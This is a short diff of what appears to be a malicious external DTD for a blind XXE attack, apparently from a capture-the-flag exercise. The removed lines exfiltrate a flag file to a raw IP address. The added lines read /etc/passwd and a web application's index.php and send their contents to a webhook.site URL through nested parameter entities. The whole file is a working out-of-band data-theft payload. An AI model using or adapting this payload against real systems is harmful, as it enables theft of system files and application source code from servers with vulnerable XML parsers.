@@ -1,4 +1,5 @@
-<!ENTITY % file SYSTEM "file:///var/www/html/phantom/flag.txt">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://18.220.254.32/phantom/log?%file;'>">
+<!ENTITY % file1 SYSTEM "file:///etc/passwd">
+<!ENTITY % file2 SYSTEM "file:///var/www/html/index.php">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/62cc91d4-7946-4c29-ac26-9c97092bd858?%file1;%file2;'>">
 %eval;
 %exfiltrate;
